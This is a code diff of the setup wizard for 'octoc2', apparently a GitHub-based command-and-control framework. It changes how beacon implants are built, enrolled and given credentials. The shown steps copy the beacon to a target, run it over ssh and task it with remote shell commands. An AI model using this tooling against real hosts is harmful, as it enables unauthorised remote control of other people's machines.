+  state: SetupState,
+): Promise<BeaconBuildResult> {
   sectionHeader("8/10  Build Beacon");
 
   const build = await promptConfirm({
-    message: "Compile a beacon binary now?",
+    message: "Compile and pre-enroll a beacon binary now? (required)",
     initialValue: true,
   });
 
   if (!build) {
-    p.log.info(`${DIM}Build later: octoctl build-beacon --outfile ./beacon${RESET}`);
-    return undefined;
+    throw new Error(
+      "Setup requires a compiled beacon and enrollment artifact before enabling recovery publication",
+    );
   }
 
   const target = await promptSelect<string>({
@@ -613,120 +933,86 @@ export async function phaseBuildBeacon(state: SetupState): Promise<string | unde
     "run", "octoctl/src/index.ts", "build-beacon",
     "--outfile", outfile,
     "--target", target,
+    "--beacon-id", state.beaconId,
   ];
-  if (state.tentaclePriority) {
-    args.push("--tentacle-priority", state.tentaclePriority);
+  const priority = normalizeRecoveryTentaclePriority(
+    state.tentaclePriority,
+    parseSetupProxyPolicies(state.proxyRepos).length > 0,
+  );
+  args.push("--tentacle-priority", priority.join(","));
+  if (state.codespaceName) {
+    args.push("--codespace-name", state.codespaceName);
   }
-  if (state.appId !== undefined) {
-    args.push("--app-id", String(state.appId));
+  if (state.githubUser) {
+    args.push("--github-user", state.githubUser);
   }
-  if (state.installationId !== undefined) {
-    args.push("--installation-id", String(state.installationId));
+  if (state.httpUrl) {
+    args.push("--http-url", state.httpUrl);
   }
 
-  let buildOutput = "";
+  const projectRoot = findProjectRoot();
   await withSpinner("Compiling beacon", async () => {
     const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
-    // build-beacon expects cwd = project root (looks for ./implant/src/index.ts)
-    const projectRoot = findProjectRoot();
+    const childEnv: Record<string, string | undefined> = {
+      ...process.env,
+      OCTOC2_REPO_OWNER: state.owner,
+      OCTOC2_REPO_NAME: state.repo,
+      OCTOC2_RECOVERY_REPO_OWNER: state.recoveryRepoOwner,
+      OCTOC2_RECOVERY_REPO_NAME: state.recoveryRepoName,
+      OCTOC2_RECOVERY_REPO_REF: state.recoveryRepoRef,
+      OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY:
+        state.recoverySigningPublicKey,
+      OCTOC2_RECOVERY_SIGNING_KEY_ID: state.recoverySigningKeyId,
+    };
+    for (const secretName of [
+      "OCTOC2_GITHUB_TOKEN",
+      "OCTOC2_OPERATOR_GITHUB_TOKEN",
+      "OCTOC2_SERVER_GITHUB_TOKEN",
+      "OCTOC2_OPERATOR_API_TOKEN",
+      "OCTOC2_BEACON_API_TOKENS",
+      "OCTOC2_OPERATOR_SECRET",
+      "OCTOC2_GITHUB_APP_PRIVATE_KEY_FILE",
+      "OCTOC2_RECOVERY_WRITE_TOKEN",
+      "OCTOC2_RECOVERY_SIGNING_SECRET_FILE",
+      "SVC_GITHUB_TOKEN",
+      "SVC_GITHUB_TOKEN_LEASE",
+      "SVC_BEACON_API_TOKEN",
+      "SVC_APP_PRIVATE_KEY",
+      "OCTOC2_APP_PRIVATE_KEY",
+    ]) {
+      delete childEnv[secretName];
+    }
     const proc = Bun.spawn([bunBin, ...args], {
       stdout: "pipe",
       stderr: "pipe",
       cwd: projectRoot,
-      env: {
-        ...process.env,
-        OCTOC2_GITHUB_TOKEN: state.token,
-        OCTOC2_REPO_OWNER: state.owner,
-        OCTOC2_REPO_NAME: state.repo,
-      },
+      env: childEnv,
     });
     const code = await proc.exited;
     if (code !== 0) {
       const stderr = await new Response(proc.stderr).text();
       throw new Error(`Build failed (exit ${code})${stderr ? `\n${stderr.trim()}` : ""}`);
     }
-    buildOutput = await new Response(proc.stdout).text();
+    await new Response(proc.stdout).text();
   });
 
-  // Extract beacon ID from build-beacon output
-  const idMatch = buildOutput.match(/Beacon ID:\s+(\S+)/);
-  const beaconId = idMatch?.[1];
-
-  const details = [`Path: ${outfile}`];
-  if (beaconId) details.push(`Beacon ID: ${beaconId}`);
+  const binaryPath = resolve(projectRoot, outfile);
+  const enrollmentPath = `${binaryPath}.enrollment.json`;
+  const details = [
+    `Path: ${binaryPath}`,
+    `Beacon ID: ${state.beaconId}`,
+    `Enrollment: ${enrollmentPath}`,
+  ];
   p.note(details.join("\n"), "Beacon compiled");
-  if (beaconId) {
-    p.log.info(`${DIM}Use this ID for tasking: octoctl task ${beaconId.slice(0, 8)} --kind shell --cmd "id"${RESET}`);
-  }
-
-  return beaconId;
-}
-
-// ── Phase 8b: Dead-drop for App auth ─────────────────────────────────────────
-
-export async function phaseDeadDrop(state: SetupState, beaconId?: string): Promise<void> {
-  if (state.authMode !== "app" || !beaconId) return;
-
-  sectionHeader("8b  Deploy App Private Key");
-
-  p.note(
-    `Your beacon uses GitHub App auth, so the private key must be\n` +
-    `delivered via an encrypted dead-drop gist — it's never baked\n` +
-    `into the binary.\n\n` +
-    `Beacon ID: ${BOLD}${beaconId}${RESET}`,
-    "Dead-drop"
+  p.log.info(
+    `${DIM}The server must import the enrollment artifact before deployment.${RESET}`,
   );
 
-  const createDrop = await promptConfirm({
-    message: "Create the dead-drop now?",
-    initialValue: true,
-  });
-
-  if (!createDrop) {
-    p.log.info(`${DIM}Create later: octoctl drop create --beacon ${beaconId.slice(0, 8)} --app-key-file <pem>${RESET}`);
-    return;
-  }
-
-  const keyPath = await promptText({
-    message: "Path to App private key PEM file",
-    placeholder: "~/.config/octoc2/app-key.pem",
-    validate: (v) => {
-      if (!v.trim()) return "Required";
-      const { existsSync } = require("node:fs");
-      const resolved = v.trim().replace(/^~/, process.env.HOME ?? "");
-      if (!existsSync(resolved)) return `File not found: ${resolved}`;
-    },
-  });
-
-  const resolvedKeyPath = keyPath.trim().replace(/^~/, process.env.HOME ?? "");
-
-  await withSpinner("Creating dead-drop gist", async () => {
-    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
-    const projectRoot = findProjectRoot();
-    const proc = Bun.spawn([
-      bunBin, "run", "octoctl/src/index.ts", "drop", "create",
-      "--beacon", beaconId.slice(0, 8),
-      "--app-key-file", resolvedKeyPath,
-    ], {
-      stdout: "pipe",
-      stderr: "pipe",
-      cwd: projectRoot,
-      env: {
-        ...process.env,
-        OCTOC2_GITHUB_TOKEN: state.token,
-        OCTOC2_REPO_OWNER: state.owner,
-        OCTOC2_REPO_NAME: state.repo,
-        OCTOC2_OPERATOR_SECRET: state.operatorSecret,
-      },
-    });
-    const code = await proc.exited;
-    if (code !== 0) {
-      const stderr = await new Response(proc.stderr).text();
-      throw new Error(`Dead-drop failed (exit ${code})${stderr ? `\n${stderr.trim()}` : ""}`);
-    }
-  });
-
-  p.log.success("Dead-drop created — beacon will pick up the key on next recovery cycle");
+  return {
+    beaconId: state.beaconId,
+    enrollmentDir: dirname(enrollmentPath),
+    binaryPath,
+  };
 }
 
 // ── Phase 9: Install to PATH ─────────────────────────────────────────────────
@@ -781,30 +1067,33 @@ export async function phaseInstall(): Promise<void> {
 export async function phaseVerify(state: SetupState): Promise<void> {
   sectionHeader("10/10  Ready");
 
+  const binaryPath = state.binaryPath ?? "./beacon";
   const steps = [
-    `octoctl start                           ${DIM}# launch server + dashboard${RESET}`,
-    `scp ./beacon target:/tmp/beacon         ${DIM}# deploy to target${RESET}`,
-    `ssh target '/tmp/beacon &'              ${DIM}# run beacon${RESET}`,
+    `octoctl start                           ${DIM}# import enrollment and publish recovery${RESET}`,
+    `scp ${binaryPath} target:/tmp/beacon`,
+    ...(state.codespaceName
+      ? [
+          `provision SVC_CODESPACES_GITHUB_TOKEN on target ${DIM}# protected runtime secret; SSH mode only${RESET}`,
+        ]
+      : []),
+    `ssh target 'env -u SVC_GITHUB_TOKEN \\`,
+    `  -u SVC_APP_PRIVATE_KEY /tmp/beacon &' ${DIM}# no static GitHub/App credential${RESET}`,
     `octoctl beacons                         ${DIM}# verify registration (~60s)${RESET}`,
     `octoctl task <id> --kind shell --cmd id ${DIM}# first task${RESET}`,
     `octoctl results <id>                    ${DIM}# read output${RESET}`,
   ];
 
-  if (state.authMode === "app") {
-    steps.splice(1, 0,
-      `octoctl drop create --beacon <id> \\`,
-      `  --app-key-file <pem>                  ${DIM}# deliver app private key${RESET}`,
-    );
-  }
-
   p.note(steps.join("\n"), "Next steps");
 
-  // Show credentials needed for dashboard login
   p.note(
-    `PAT:          ${maskToken(state.token)}\n` +
-    `Server URL:   http://localhost:8080\n` +
-    `Operator key: ${state.operatorSecret}`,
-    "Dashboard login credentials"
+    `Beacon ID:       ${state.beaconId}\n` +
+    `Controller env:  ${state.envPath ?? "(not written)"}\n` +
+    `Enrollment dir:  ${state.enrollmentDir ?? "(build later)"}\n` +
+    `Operator API:    ${maskToken(state.operatorApiToken)}\n` +
+    `Dashboard:       http://localhost:5173\n\n` +
+    `HTTP and gRPC listeners remain disabled by default. To use the\n` +
+    `dashboard API or direct channels, enable the listener in the\n` +
+    `controller .env and provision TLS before exposing it.`,
+    "Provisioning summary"
   );
-  p.log.info(`${DIM}Open http://localhost:3000 and enter the PAT + operator key to decrypt results${RESET}`);
 }
